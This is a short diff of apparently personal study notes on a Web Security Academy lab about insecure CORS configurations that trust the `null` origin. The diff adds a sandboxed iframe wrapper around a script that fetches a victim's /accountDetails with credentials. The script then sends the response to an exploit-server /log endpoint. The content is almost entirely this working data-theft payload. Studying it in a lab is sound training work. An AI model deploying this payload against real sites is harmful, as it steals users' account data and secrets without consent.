@@ -30,17 +30,18 @@ An attacker might be able to gain access using the domain:
 
 ____
 The specification for the Origin header supports the value `null`
-
+Using an `<iframe>` with the `sandbox` attribute can bypass certain restrictions and simulate a `null` origin when testing insecure CORS **configurations**
 ```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
 <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://0a2b001b036b9a14821d6a3000c3008c.web-security-academy.net/accountDetails',true);
+    req.open('get', 'https://0ada006c04817488807e76b3005b0066.web-security-academy.net/accountDetails', true);
     req.withCredentials = true;
     req.send();
-
     function reqListener() {
-        location='/log?key='+this.responseText;
+        location = 'https://exploit-0a9a008904eb743c806375f8019f00e7.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
     };
-</script>
+</script>">
+</iframe>
 ```
